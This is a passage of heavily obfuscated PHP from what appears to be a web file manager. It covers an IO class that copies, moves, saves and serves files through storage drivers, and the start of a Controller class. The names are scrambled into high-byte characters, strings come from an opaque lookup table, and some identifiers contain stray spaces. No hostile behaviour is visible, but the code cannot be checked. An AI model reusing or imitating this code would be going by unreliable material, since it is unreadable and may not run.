implode(PHP_EOL, $×æ¦Ö÷™); if ($î¶¾°Õ¸ && $î¶¾°Õ¸ == $áã²µ×Š[810]) { return $ñ‘ˆæÍÖ; } $¥¢ÌãÈõ = array($áã²µ×Š[810] => $ñ‘ˆæÍÖ, $áã²µ×Š[13] => $¹¦Í‰˜Ê); return $î¶¾°Õ¸ ? $¥¢ÌãÈõ[$î¶¾°Õ¸] : $¥¢ÌãÈõ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($˜­°Ä¯, $——¨úü) { $îë’‹ğ =& $_SERVER[Ü©»’·]; $˜ÅÁœº¡ = $——¨úü; $GLOBALS[$îë’‹ğ[1149]] = $îë’‹ğ[1150] . $˜­°Ä¯; Hook::trigger($îë’‹ğ[1150] . $˜­°Ä¯ . $îë’‹ğ[1151], $˜ÅÁœº¡); $Õ×‹ß¬á = self::driverMake($——¨úü[0]); if (!$Õ×‹ß¬á) { return !1; } if (method_exists($Õ×‹ß¬á, $˜­°Ä¯)) { $âôÁ—÷‘ = @call_user_func_array(array($Õ×‹ß¬á, $˜­°Ä¯), $——¨úü); } else { if (method_exists($Õ×‹ß¬á, $îë’‹ğ[1152])) { $âôÁ—÷‘ = @call_user_func_array(array($Õ×‹ß¬á, $˜­°Ä¯), $——¨úü); } else { if (method_exists(self, $˜­°Ä¯)) { $âôÁ—÷‘ = @call_user_func_array(array(self, $˜­°Ä¯), $——¨úü); } else { $âôÁ—÷‘ = call_user_func_array(array(parent, $˜­°Ä¯), $——¨úü); } } } Hook::trigger($îë’‹ğ[1150] . $˜­°Ä¯ . $îë’‹ğ[1153], $˜ÅÁœº¡, $âôÁ—÷‘); return $âôÁ—÷‘; } public static function init($çˆ¿Óí) { return self::driverMake($çˆ¿Óí); } public static function copy($â‚¥’ñ¦, $§ŒÅü›, $îµ¦±ªè = false, $¦®„¿á® = false) { return self::copyMoveStart($â‚¥’ñ¦, $§ŒÅü›, $îµ¦±ªè, $_SERVER[Ü©»’·][564], $¦®„¿á®); } public static function move($Î†å†‘¶, $†Çï¦ß¢, $õôĞÃÊ = false, $©Ä¤‡¹Ğ = false) { return self::copyMoveStart($Î†å†‘¶, $†Çï¦ß¢, $õôĞÃÊ, $_SERVER[Ü©»’·][566], $©Ä¤‡¹Ğ); } private static function copyMoveStart($©¬Ì›Ï, $²©Í²¥È, $Øâ²ñè, $÷—°Ğ°, $ôÏ»‰ş’) { $š»¥—ú’ =& $_SERVER[Ü©»’·]; $À«¦Î¹â = array($©¬Ì›Ï, $²©Í²¥È, $Øâ²ñè, $ôÏ»‰ş’); Hook::trigger($š»¥—ú’[1150] . $÷—°Ğ° . $š»¥—ú’[1151], $À«¦Î¹â); $À¦Û¸Ä = self::copyMove($©¬Ì›Ï, $²©Í²¥È, $Øâ²ñè, $÷—°Ğ°, $ôÏ»‰ş’); Hook::trigger($š»¥—ú’[1150] . $÷—°Ğ° . $š»¥—ú’[1153], $À«¦Î¹â, $À¦Û¸Ä); return $À¦Û¸Ä; } public static function saveFile($ğÉ¾ŠÏŞ, $¢Ó¦Çğ, $€Ë’€ = true) { $íÌ÷ö˜õ =& $_SERVER[Ü©»’·]; $…£‡ıÈ— = self::info($¢Ó¦Çğ); $Ã…í„ô™ = self::driverMake($ğÉ¾ŠÏŞ); $Ñú¶í®Ê = self::driverMake($¢Ó¦Çğ); $Â•×èÑÈ = !1; if ($Ñú¶í®Ê->pathParse[$íÌ÷ö˜õ[1154]]) { $Â•×èÑÈ = $Ñú¶í®Ê; $ŞÅ²ÅÇ = $Ñú¶í®Ê->pathParse[$íÌ÷ö˜õ[1154]]; $Ñú¶í®Ê = self::driverMake($ŞÅ²ÅÇ); } if ($Ã…í„ô™->pathParse[$íÌ÷ö˜õ[1154]]) { $şÃóµ¢ó = $Ã…í„ô™->pathParse[$íÌ÷ö˜õ[1154]]; $Ã…í„ô™ = self::driverMake($şÃóµ¢ó); } $÷éğé·’ = $Ñú¶í®Ê->pathFather($¢Ó¦Çğ); $Ò¶Çã² = !0; if (!$€Ë’€ && self::driverIsSame($Ã…í„ô™, $Ñú¶í®Ê)) { $Ò¶Çã² = !1; } $ÍÏ¸ªÙğ = self::copyFile($Ã…í„ô™, $ğÉ¾ŠÏŞ, $Ñú¶í®Ê, $÷éğé·’, $…£‡ıÈ—[$íÌ÷ö˜õ[32]], $Ò¶Çã²); if ($Â•×èÑÈ) { $ÍÏ¸ªÙğ = $Â•×èÑÈ->getPathOuter($ÍÏ¸ªÙğ); } return $ÍÏ¸ªÙğ; } private static function copyMove($’ñØñäÈ, $¶æÂ¾ñª, $¨ã¹ÖÒ, $ú¸×·, $†›ØÅÙê = false) { $§ŞÔ‹¨ =& $_SERVER[Ü©»’·]; if (!$’ñØñäÈ || $’ñØñäÈ == $§ŞÔ‹¨[8] || !$¶æÂ¾ñª) { return !1; } ignore_timeout(); $£óÀÒİ = self::driverMake($’ñØñäÈ); $ÃÒ—ë¿ = self::driverMake($¶æÂ¾ñª); $¨›Õ¦ = $ú¸×· == $§ŞÔ‹¨[566]; $Û¼Şõ®ç = !1; if ($ÃÒ—ë¿->pathParse[$§ŞÔ‹¨[1154]]) { $Û¼Şõ®ç = $ÃÒ—ë¿; $¶æÂ¾ñª = $ÃÒ—ë¿->pathParse[$§ŞÔ‹¨[1154]]; $ÃÒ—ë¿ = self::driverMake($¶æÂ¾ñª); } if ($£óÀÒİ->pathParse[$§ŞÔ‹¨[1154]]) { $’ñØñäÈ = $£óÀÒİ->pathParse[$§ŞÔ‹¨[1154]]; $£óÀÒİ = self::driverMake($’ñØñäÈ); } self::check($£óÀÒİ, $’ñØñäÈ, $ÃÒ—ë¿, $¶æÂ¾ñª); Hook::trigger($§ŞÔ‹¨[1155], $£óÀÒİ, $’ñØñäÈ, $ÃÒ—ë¿, $¶æÂ¾ñª); $É„ÔÂî = self::driverIsSame($£óÀÒİ, $ÃÒ—ë¿); if ($É„ÔÂî) { if ($ú¸×· == $§ŞÔ‹¨[566] && !method_exists($ÃÒ—ë¿, $§ŞÔ‹¨[1156]) && trim($¶æÂ¾ñª, $§ŞÔ‹¨[8]) == trim($ÃÒ—ë¿->pathFather($’ñØñäÈ), $§ŞÔ‹¨[8])) { if ($£óÀÒİ->pathThis($’ñØñäÈ) != $†›ØÅÙê && !$£óÀÒİ->isTypeObject()) { return $£óÀÒİ->rename($’ñØñäÈ, $†›ØÅÙê); } return $ÃÒ—ë¿->getPathOuter($’ñØñäÈ); } if (method_exists($ÃÒ—ë¿, $ú¸×·)) { return $ÃÒ—ë¿->{$ú¸×·}($’ñØñäÈ, $¶æÂ¾ñª, $¨ã¹ÖÒ, $†›ØÅÙê); } } if ($É„ÔÂî && $ú¸×· == $§ŞÔ‹¨[566] && $ÃÒ—ë¿->getType() == $§ŞÔ‹¨[106]) { $ò½†ĞıÍ = $ÃÒ—ë¿->movePath($’ñØñäÈ, $¶æÂ¾ñª, $†›ØÅÙê); if ($ò½†ĞıÍ) { return $ò½†ĞıÍ; } } $ƒ—Æºµñ = $£óÀÒİ->isFile($’ñØñäÈ); if (!$ƒ—Æºµñ && $ÃÒ—ë¿->getType() == $§ŞÔ‹¨[764] && $£óÀÒİ->getType() == $§ŞÔ‹¨[106]) { $ò½†ĞıÍ = $ÃÒ—ë¿->copyFolderFromIO($£óÀÒİ, $’ñØñäÈ, $¶æÂ¾ñª, $¨ã¹ÖÒ, $¨›Õ¦, $†›ØÅÙê); } else { $ò½†ĞıÍ = self::copyPath($£óÀÒİ, $’ñØñäÈ, $ÃÒ—ë¿, $¶æÂ¾ñª, $¨ã¹ÖÒ, $¨›Õ¦, $ƒ—Æºµñ, $†›ØÅÙê); } if ($ò½†ĞıÍ && $¨›Õ¦) { $£óÀÒİ->remove($’ñØñäÈ); } if ($Û¼Şõ®ç) { $ò½†ĞıÍ = $Û¼Şõ®ç->getPathOuter($ò½†ĞıÍ); } return $ò½†ĞıÍ; } private static function check($Ÿ©šÚ¿å, $¡äã‰Ş¯, $ê¦ƒì…—, &$İ±¹›Òê) { $¹ã¥íÃÏ =& $_SERVER[Ü©»’·]; if (self::driverIsSame($Ÿ©šÚ¿å, $ê¦ƒì…—) && $Ÿ©šÚ¿å->isFolder($¡äã‰Ş¯) && $Ÿ©šÚ¿å->isParentOf($¡äã‰Ş¯, $İ±¹›Òê)) { show_json(LNG($¹ã¥íÃÏ[1157]), !1); } if (!$Ÿ©šÚ¿å->exist($¡äã‰Ş¯)) { show_json(LNG($¹ã¥íÃÏ[105]), !1); } } private static function copyPath($Äœ”ñâ, $­£©õèù, $Â’­Ş¤, $ïãŸ«¥, $‰áØ©•, $€¹Ğåö‘, $€…ˆ†ùÁ, $å¨¢¹ã¨ = false, $úİÇ©½î = true) { $Ç²—ñõ =& $_SERVER[Ü©»’·]; $û‚ª·Àå = empty($å¨¢¹ã¨) && $å¨¢¹ã¨ !== $Ç²—ñõ[197] ? $Äœ”ñâ->pathThis($­£©õèù) : $å¨¢¹ã¨; if ($‰áØ©•) { $§–Æ…’ = $Â’­Ş¤->fileNameExist($ïãŸ«¥, $û‚ª·Àå); $ïÀ¾Óàô = $û‚ª·Àå; $û‚ª·Àå = $Â’­Ş¤->fileNameAuto($ïãŸ«¥, $û‚ª·Àå, $‰áØ©•, !$€…ˆ†ùÁ); if (!$§–Æ…’ || $ïÀ¾Óàô != $û‚ª·Àå) { $‰áØ©• = !1; } if ($úİÇ©½î && !$‰áØ©•) { $Â’­Ş¤->_data[$Ç²—ñõ[1158]] = !0; } } if ($€…ˆ†ùÁ) { return self::copyFile($Äœ”ñâ, $­£©õèù, $Â’­Ş¤, $ïãŸ«¥, $û‚ª·Àå, $€¹Ğåö‘); } if ($‰áØ©• == REPEAT_RENAME_FOLDER) { $‰áØ©• = !1; } $Ç†µıôÏ = rtrim($ïãŸ«¥, $Ç²—ñõ[8]) . $Ç²—ñõ[8] . $û‚ª·Àå; $¸úêéØ‹ = $Â’­Ş¤->mkdir($Â’­Ş¤->getPath($Ç†µıôÏ), $‰áØ©•); $ïãŸ«¥ = $Â’­Ş¤->getPathInner($¸úêéØ‹); $•—”›å = $Äœ”ñâ->listPath($­£©õèù, !0); $•—”›å = is_array($•—”›å) ? $•—”›å : array($Ç²—ñõ[83] => array(), $Ç²—ñõ[82] => array()); $ñàû¦Á¼ = array_merge($•—”›å[$Ç²—ñõ[83]], $•—”›å[$Ç²—ñõ[82]]); foreach ($ñàû¦Á¼ as $ôËî±‚²) { $ÁËÓ¥« = $ôËî±‚²[$Ç²—ñõ[33]] == $Ç²—ñõ[199]; $­£©õèù = $Äœ”ñâ->getPathInner($ôËî±‚²[$Ç²—ñõ[84]]); $ùõÓÂÓ¯ = self::copyPath($Äœ”ñâ, $­£©õèù, $Â’­Ş¤, $ïãŸ«¥, $‰áØ©•, $€¹Ğåö‘, $ÁËÓ¥«, !1, !1); if (!$ùõÓÂÓ¯) { IO::errorTips($Ç²—ñõ[1159] . $­£©õèù . $Ç²—ñõ[70] . $ïãŸ«¥); } } self::copyMoveKeepInfo($Äœ”ñâ, $­£©õèù, $¸úêéØ‹); return $¸úêéØ‹; } private static function copyFile($¡æîŞˆ‰, $ƒ¸íçúë, $¨ÙáÑ‰ê, $âºÜ—ì‹, $ §í›¼°, $êéÊÃËü) { $õÄÀÎú =& $_SERVER[Ü©»’·]; $âºÜ—ì‹ = $¨ÙáÑ‰ê->getPath(rtrim($âºÜ—ì‹, $õÄÀÎú[8]) . $õÄÀÎú[8] . $ §í›¼°); $áü‹Ñ´  = $õÄÀÎú[1160] . time() . rand_string(5); Hook::trigger($õÄÀÎú[1161], $¡æîŞˆ‰, $ƒ¸íçúë, $¨ÙáÑ‰ê, $âºÜ—ì‹, $ §í›¼°, $áü‹Ñ´ ); if (self::driverIsSame($¡æîŞˆ‰, $¨ÙáÑ‰ê)) { if ($êéÊÃËü) { $Çıœ¼ÌÕ = $¨ÙáÑ‰ê->moveFile($ƒ¸íçúë, $âºÜ—ì‹); } else { $Çıœ¼ÌÕ = $¨ÙáÑ‰ê->copyFile($ƒ¸íçúë, $âºÜ—ì‹); } Hook::trigger($õÄÀÎú[1162], $¡æîŞˆ‰, $ƒ¸íçúë, $¨ÙáÑ‰ê, $âºÜ—ì‹, $ §í›¼°, $Çıœ¼ÌÕ); self::copyMoveKeepInfo($¡æîŞˆ‰, $ƒ¸íçúë, $Çıœ¼ÌÕ); return $Çıœ¼ÌÕ; } $¼İ±ñØ– = TEMP_FILES; if ($GLOBALS[$õÄÀÎú[6]][$õÄÀÎú[89]][$õÄÀÎú[802]]) { $¼İ±ñØ– = $GLOBALS[$õÄÀÎú[6]][$õÄÀÎú[89]][$õÄÀÎú[802]]; } $«ÊßµÔÛ = $¼İ±ñØ–; mk_dir($«ÊßµÔÛ); $óƒÎ»ú = $«ÊßµÔÛ . $áü‹Ñ´ ; $‹Ì–Ïî = $óƒÎ»ú; $óƒÎ»ú = $¡æîŞˆ‰->download($ƒ¸íçúë, $óƒÎ»ú); $óƒÎ»ú = $¡æîŞˆ‰->iconvApp($óƒÎ»ú); if (substr($óƒÎ»ú, strlen($¼İ±ñØ–)) == $¼İ±ñØ–) { $êéÊÃËü = !0; } $Çıœ¼ÌÕ = $¨ÙáÑ‰ê->upload($âºÜ—ì‹, $óƒÎ»ú, $êéÊÃËü); self::remove($‹Ì–Ïî); Hook::trigger($õÄÀÎú[1162], $¡æîŞˆ‰, $ƒ¸íçúë, $¨ÙáÑ‰ê, $âºÜ—ì‹, $ §í›¼°, $Çıœ¼ÌÕ); self::copyMoveKeepInfo($¡æîŞˆ‰, $ƒ¸íçúë, $Çıœ¼ÌÕ); return $Çıœ¼ÌÕ; } private static function copyMoveKeepInfo($Ëƒ‡ª¾Ê, $°ÉÍüç, $¸¨Ş¸¯) { if (!$¸¨Ş¸¯) { return; } $ò·šˆíë = $Ëƒ‡ª¾Ê->info($°ÉÍüç); if (!is_array($ò·šˆíë)) { return; } IO::setModifyTime($¸¨Ş¸¯, $ò·šˆíë[$_SERVER[Ü©»’·][85]]); } public static function pathFather($½Ë§Â) { $¤‹—ŸÑ = IO::init($½Ë§Â); $œõ›Ğ” = $¤‹—ŸÑ->pathFather($¤‹—ŸÑ->path); return $¤‹—ŸÑ->getPathOuter($œõ›Ğ”); } public static function fileOut($¶£éÎÍ, $æà­Ê»ü = false, $š ãÃ° = false, $”öÚñû = '') { $••âŞâÂ = self::driverMake($¶£éÎÍ); if ($••âŞâÂ->isFileOutServer()) { return $••âŞâÂ->fileOutServer($¶£éÎÍ, $æà­Ê»ü, $š ãÃ°, $”öÚñû); } return $••âŞâÂ->fileOut($¶£éÎÍ, $æà­Ê»ü, $š ãÃ°, $”öÚñû); } public static function fileOutImage($Ê×—£ó›, $ÖÙ„î­ = 250) { $°Öéğ’¢ = array(250, 600, 1200, 2000, 3000, 5000); for ($«ë˜¯â = 0; $«ë˜¯â < count($°Öéğ’¢); $«ë˜¯â++) { if ($«ë˜¯â == 0 && $ÖÙ„î­ <= $°Öéğ’¢[$«ë˜¯â]) { $ÖÙ„î­ = $°Öéğ’¢[$«ë˜¯â]; break; } else { if ($ÖÙ„î­ > $°Öéğ’¢[$«ë˜¯â - 1] && $ÖÙ„î­ <= $°Öéğ’¢[$«ë˜¯â]) { $ÖÙ„î­ = $°Öéğ’¢[$«ë˜¯â]; break; } else { if ($«ë˜¯â == count($°Öéğ’¢) - 1 && $ÖÙ„î­ > $°Öéğ’¢[$«ë˜¯â]) { $ÖÙ„î­ = $°Öéğ’¢[$«ë˜¯â]; break; } } } } $Ô©„ åÍ = self::driverMake($Ê×—£ó›); if ($Ô©„ åÍ->isFileOutServer()) { return $Ô©„ åÍ->fileOutImageServer($Ê×—£ó›, $ÖÙ„î­); } return $Ô©„ åÍ->fileOutImage($Ê×—£ó›, $ÖÙ„î­); } private static function driverIsSame($èâß“ÉŸ, $Ôğœïã…) { $º‚Ö˜ğ =& $_SERVER[Ü©»’·]; $°òÀÙÑ = $èâß“ÉŸ->getType(); $’ÒÅ¯ğõ = $Ôğœïã…->getType(); if ($°òÀÙÑ != $’ÒÅ¯ğõ) { return !1; } if ($°òÀÙÑ == $º‚Ö˜ğ[764]) { return !0; } if ($°òÀÙÑ == $º‚Ö˜ğ[106]) { return !0; } if ($èâß“ÉŸ->pathDriver == $Ôğœïã…->pathDriver) { return !0; } return !1; } public static function copyUpdate($Â„¾¡§á, $›ğ¢ù“‰) { $å½‰á’š =& $_SERVER[Ü©»’·]; if (!IO::exist($Â„¾¡§á)) { return !1; } if (!IO::exist($›ğ¢ù“‰)) { IO::mkdir($›ğ¢ù“‰); } $©îá–­ñ = self::_listAll($Â„¾¡§á); $§››´¢ü = self::_listAll($›ğ¢ù“‰); $ò±’¿áÓ = array(); $áâ¨€õ = array(); foreach ($©îá–­ñ as $è¸œ°ÙØ => $ªâÈ¼×) { if (isset($§››´¢ü[$è¸œ°ÙØ])) { if ($ªâÈ¼×[$å½‰á’š[75]] == 1) { continue; } if ($§››´¢ü[$è¸œ°ÙØ][$å½‰á’š[76]] == $ªâÈ¼×[$å½‰á’š[76]]) { continue; } } if ($ªâÈ¼×[$å½‰á’š[75]] == 1) { $áâ¨€õ[] = $›ğ¢ù“‰ . $å½‰á’š[8] . $è¸œ°ÙØ; continue; } $­†éúÚÍ = strstr(trim($è¸œ°ÙØ, $å½‰á’š[8]), $å½‰á’š[8]) ? get_path_father($è¸œ°ÙØ) : $å½‰á’š[12]; $ò±’¿áÓ[] = array($å½‰á’š[1163] => $ªâÈ¼×[$å½‰á’š[84]], $å½‰á’š[1164] => rtrim($›ğ¢ù“‰, $å½‰á’š[8]) . $å½‰á’š[8] . $­†éúÚÍ, $å½‰á’š[1165] => $ªâÈ¼×); } $äÄö†…å = array($å½‰á’š[199] => $ò±’¿áÓ, $å½‰á’š[75] => $áâ¨€õ); Hook::trigger($å½‰á’š[1166], $Â„¾¡§á, $›ğ¢ù“‰, $äÄö†…å); foreach ($áâ¨€õ as $ªâÈ¼×) { IO::mkdir($ªâÈ¼×); } foreach ($ò±’¿áÓ as $ªâÈ¼×) { IO::copy($ªâÈ¼×[$å½‰á’š[1163]], $ªâÈ¼×[$å½‰á’š[1164]], REPEAT_REPLACE); } } private static function _listAll($¾Á§ƒ­) { $ë¾Ó›‚’ =& $_SERVER[Ü©»’·]; $¾Á§ƒ­ = KodIO::clear($¾Á§ƒ­); $Ö®ŠóÑ = IO::listAll($¾Á§ƒ­); foreach ($Ö®ŠóÑ as &$–†»¶ºÃ) { $ÕÁ¹ÍÌå = substr($–†»¶ºÃ[$ë¾Ó›‚’[84]], strlen($¾Á§ƒ­)); $–†»¶ºÃ[$ë¾Ó›‚’[1167]] = trim($ÕÁ¹ÍÌå, $ë¾Ó›‚’[8]); } unset($–†»¶ºÃ); return array_to_keyvalue($Ö®ŠóÑ, $ë¾Ó›‚’[1167]); } public static function fileSubstr($äëäœê, $´Ñ¢®˜¨, $º×ó¨Ê´ = false) { $¿ÓœÙ›´ =& $_SERVER[Ü©»’·]; $±Æöè÷‚ = self::driverMake($äëäœê); $·®¢ ­ª = $±Æöè÷‚->size($äëäœê); $ÄôÇñ„Ã = $´Ñ¢®˜¨; $¯èçãş± = $º×ó¨Ê´; if ($´Ñ¢®˜¨ < 0) { $´Ñ¢®˜¨ = $·®¢ ­ª + $´Ñ¢®˜¨; } if ($º×ó¨Ê´ === !1) { $º×ó¨Ê´ = $·®¢ ­ª - $´Ñ¢®˜¨; } if ($´Ñ¢®˜¨ + $º×ó¨Ê´ > $·®¢ ­ª) { $º×ó¨Ê´ = $·®¢ ­ª - $´Ñ¢®˜¨; } if (!$·®¢ ­ª && $±Æöè÷‚->getType() == $¿ÓœÙ›´[106] && !$±Æöè÷‚->exist($äëäœê)) { $©á¿‚×ó = get_path_this($äëäœê); $æáÂ“â = parse_url_query($©á¿‚×ó); if (is_array($æáÂ“â) && isset($æáÂ“â[$¿ÓœÙ›´[32]])) { $©á¿‚×ó = urldecode($æáÂ“â[$¿ÓœÙ›´[32]]); } throw new Exception($¿ÓœÙ›´[1168] . LNG($¿ÓœÙ›´[1169]) . $¿ÓœÙ›´[969] . clear_html($©á¿‚×ó) . $¿ÓœÙ›´[12]); } if ($º×ó¨Ê´ <= 0) { return $¿ÓœÙ›´[12]; } if ($´Ñ¢®˜¨ < 0 || $´Ñ¢®˜¨ >= $·®¢ ­ª || $º×ó¨Ê´ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\145\122\x65\x61\144\40\x65\x72\x72\x6f\x72\x21\x20\x73\164\x61\x72\164\75{$´Ñ¢®˜¨}\x3b\x6c\145\x6e\x67\x74\150\x3d{$º×ó¨Ê´}\73\x20\163\x69\x7a\145\x3d{$·®¢ ­ª}\73"); } $Ï²öğ™¯ = $±Æöè÷‚->fileSubstr($äëäœê, $´Ñ¢®˜¨, $º×ó¨Ê´); if (!$Ï²öğ™¯ && $º×ó¨Ê´ && isset($GLOBALS[$¿ÓœÙ›´[1170]])) { throw new Exception($GLOBALS[$¿ÓœÙ›´[1170]][$¿ÓœÙ›´[1171]]); } return $Ï²öğ™¯; } private static function driverMake(&$‘ÚÖÀ¹) { $´‰Ğİöá =& $_SERVER[Ü©»’·]; $Ñ“ºã¤™ = KodIO::parse($‘ÚÖÀ¹); if (!self::$driverListSystem) { $…İ•’ú˜ = Model($´‰Ğİöá[773])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($…İ•’ú˜, $´‰Ğİöá[408]); } if ($Ñ“ºã¤™[$´‰Ğİöá[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ñ“ºã¤™[$´‰Ğİöá[408]]]) { return !1; } $‘ÚÖÀ¹ = $Ñ“ºã¤™[$´‰Ğİöá[1172]]; $ßÜˆÄŒ = self::driverGet($Ñ“ºã¤™, $‘ÚÖÀ¹); return $ßÜˆÄŒ; } private static function driverGet($İ´Ê§ë–, &$„§ªäÂ) { $áê„Àõ„ =& $_SERVER[Ü©»’·]; $€ƒ÷Ò– = $İ´Ê§ë–[$áê„Àõ„[1173]]; $ĞÔâ‰â = $İ´Ê§ë–[$áê„Àõ„[408]]; switch ($İ´Ê§ë–[$áê„Àõ„[33]]) { case KodIO::KOD_IO: $Â©ëĞ»Ö = self::$driverListSystem[$ĞÔâ‰â]; break; case KodIO::KOD_SOURCE: $„§ªäÂ = $ĞÔâ‰â . $„§ªäÂ; $Â©ëĞ»Ö = array($áê„Àõ„[1174] => $áê„Àõ„[1175], $áê„Àõ„[6] => $İ´Ê§ë–); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¾°½ÁĞá = $GLOBALS[$áê„Àõ„[1176]]; self::$driverListUser = array_to_keyvalue($¾°½ÁĞá, $áê„Àõ„[408]); } $Â©ëĞ»Ö = self::$driverListUser[$ĞÔâ‰â]; break; case KodIO::KOD_SHARE_LINK: $Â©ëĞ»Ö = array($áê„Àõ„[1174] => $áê„Àõ„[1177], $áê„Àõ„[6] => $İ´Ê§ë–); $¨‡¹¿®— = Action($áê„Àõ„[1178])->sharePathInfo($İ´Ê§ë–[$áê„Àõ„[84]]); $„§ªäÂ = $¨‡¹¿®—[$áê„Àõ„[411]]; if (!$¨‡¹¿®—[$áê„Àõ„[411]]) { $«à¸«øï = Model($áê„Àõ„[610])->getInfo($¨‡¹¿®—[$áê„Àõ„[498]]); $„§ªäÂ = KodIO::clear($«à¸«øï[$áê„Àõ„[1179]] . $İ´Ê§ë–[$áê„Àõ„[1172]]); $İ´Ê§ë–[$áê„Àõ„[496]] = $«à¸«øï; $İ´Ê§ë–[$áê„Àõ„[1154]] = $„§ªäÂ; $Â©ëĞ»Ö = array($áê„Àõ„[1174] => $áê„Àõ„[1180], $áê„Àõ„[6] => $İ´Ê§ë–); } break; case KodIO::KOD_SHARE_ITEM: $Â©ëĞ»Ö = array($áê„Àõ„[1174] => $áê„Àõ„[1181], $áê„Àõ„[6] => $İ´Ê§ë–); $«à¸«øï = Model($áê„Àõ„[610])->getInfo($İ´Ê§ë–[$áê„Àõ„[408]]); if ($«à¸«øï[$áê„Àõ„[411]] == $áê„Àõ„[197]) { $„§ªäÂ = KodIO::clear($«à¸«øï[$áê„Àõ„[1179]] . $İ´Ê§ë–[$áê„Àõ„[1172]]); $İ´Ê§ë–[$áê„Àõ„[496]] = $«à¸«øï; $İ´Ê§ë–[$áê„Àõ„[1154]] = $„§ªäÂ; $Â©ëĞ»Ö = array($áê„Àõ„[1174] => $áê„Àõ„[1182], $áê„Àõ„[6] => $İ´Ê§ë–); } else { if (!$„§ªäÂ) { $„§ªäÂ = $«à¸«øï[$áê„Àõ„[411]]; } } break; default: $„§ªäÂ = $İ´Ê§ë–[$áê„Àõ„[84]]; $Â©ëĞ»Ö = array($áê„Àõ„[1174] => $áê„Àõ„[1183]); break; } $…Õ¤œóÕ = $İ´Ê§ë–[$áê„Àõ„[84]]; if (!isset(self::$driverCache[$…Õ¤œóÕ])) { $¦ ä¯òß = strtolower($Â©ëĞ»Ö[$áê„Àõ„[95]]); $¯ï¦ùÌ = $GLOBALS[$áê„Àõ„[6]][$áê„Àõ„[89]][$áê„Àõ„[832]]; $¶ÛŠÈÇ = $áê„Àõ„[74] . (isset($¯ï¦ùÌ[$¦ ä¯òß]) ? $¯ï¦ùÌ[$¦ ä¯òß] : ucfirst($¦ ä¯òß)); if (!class_exists($¶ÛŠÈÇ)) { show_json("{$¶ÛŠÈÇ}\x20\156\x6f\164\x20\x65\170\151\x73\164\x73\41", !1); } $…¯Â±åñ = isset($Â©ëĞ»Ö[$áê„Àõ„[6]]) ? $Â©ëĞ»Ö[$áê„Àõ„[6]] : !1; self::$driverCache[$…Õ¤œóÕ] = new $¶ÛŠÈÇ($…¯Â±åñ); } $üÌø‚È = self::$driverCache[$…Õ¤œóÕ]; $üÌø‚È->pathDriver = $€ƒ÷Ò–; $üÌø‚È->pathBase = $áê„Àõ„[12]; if (isset($Â©ëĞ»Ö[$áê„Àõ„[6]][$áê„Àõ„[1184]])) { $üÌø‚È->pathBase = rtrim($Â©ëĞ»Ö[$áê„Àõ„[6]][$áê„Àõ„[1184]], $áê„Àõ„[8]) . $áê„Àõ„[8]; $„§ªäÂ = $üÌø‚È->pathBase . ltrim($„§ªäÂ, $áê„Àõ„[8]); } $„§ªäÂ = $üÌø‚È->getPath($„§ªäÂ); if (isset($İ´Ê§ë–[$áê„Àõ„[1154]])) { $„§ªäÂ = $İ´Ê§ë–[$áê„Àõ„[1154]]; } $üÌø‚È->path = $„§ªäÂ; return $üÌø‚È; } public static function errorTips($¡Õ¸Íı = false) { $º¢¸ŒÙ® =& $_SERVER[Ü©»’·]; static $ƒ½ÂÊ´Œ = array(); $¹˜½ˆ¿ = 1000; if ($¡Õ¸Íı === -1) { return $ƒ½ÂÊ´Œ ? $ƒ½ÂÊ´Œ[count($ƒ½ÂÊ´Œ) - 1] : $º¢¸ŒÙ®[12]; } if ($¡Õ¸Íı === !1) { return implode($º¢¸ŒÙ®[231], $ƒ½ÂÊ´Œ); } if (count($ƒ½ÂÊ´Œ) >= $¹˜½ˆ¿) { $ƒ½ÂÊ´Œ = array_slice($ƒ½ÂÊ´Œ, $¹˜½ˆ¿ * 0.5, $¹˜½ˆ¿); } $ƒ½ÂÊ´Œ[] = $¡Õ¸Íı; write_log($º¢¸ŒÙ®[162] . ACTION . $º¢¸ŒÙ®[1185] . $¡Õ¸Íı, $º¢¸ŒÙ®[1186]); } public static function getLastError($ğ«´™º¤ = '') { $ö¯œ‹Ù“ = self::errorTips(-1); return $ö¯œ‹Ù“ ? $ö¯œ‹Ù“ : $ğ«´™º¤; } } goto C³·‚ë„è¦; f Ø§Ã‰“Û: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ó®äÙÆ° =& $_SERVER[Ü©»’·]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ó®äÙÆ°[6]] =& $config; $this->values[$Ó®äÙÆ°[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ó®äÙÆ°[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($öãì¾£ò) { if (1 === func_num_args()) { $this->{$öãì¾£ò} = new $öãì¾£ò(); } else { $šÕ€¬¿‡ = new ReflectionClass($öãì¾£ò); $Â…ËŒñ = func_get_args(); array_shift($Â…ËŒñ); $this->{$öãì¾£ò} = $šÕ€¬¿‡->newInstanceArgs($Â…ËŒñ); } return $this->{$öãì¾£ò}; } public function routeBind($êÇë–à, $¶÷±§ç¸, $ÏÄ¸¡”µ = 3) { $ØßÚòÎ× =& $_SERVER[Ü©»’·]; $’˜’¥¶Ù = $this->in[$ØßÚòÎ×[9]]; $êÇë–à = str_replace($ØßÚòÎ×[10], $ØßÚòÎ×[11], trim(trim($êÇë–à, $ØßÚòÎ×[8]), $ØßÚòÎ×[12])); if (!$êÇë–à || count($’˜’¥¶Ù) <= $ÏÄ¸¡”µ) { return !1; } $Øççµ„§ = !0; $÷•ê•„˜ = explode($ØßÚòÎ×[8], $êÇë–à); for ($òÈ¶ˆ™ = 0; $òÈ¶ˆ™ < count($÷•ê•„˜); $òÈ¶ˆ™++) { if ($÷•ê•„˜[$òÈ¶ˆ™] != $’˜’¥¶Ù[$ÏÄ¸¡”µ + $òÈ¶ˆ™]) { $Øççµ„§ = !1; break; } } if (!$Øççµ„§) { return; } call_user_func_array(array($this, $¶÷±§ç¸), array()); } public function routeArgs($û×ªá‡Î = 3) { $Õ³¢¥¦€ = $this->in[$_SERVER[Ü©»’·][9]]; if (count($Õ³¢¥¦€) <= $û×ªá‡Î) { return array(); } $¸——–èô = array(); for ($Ç¡¥”Ö = 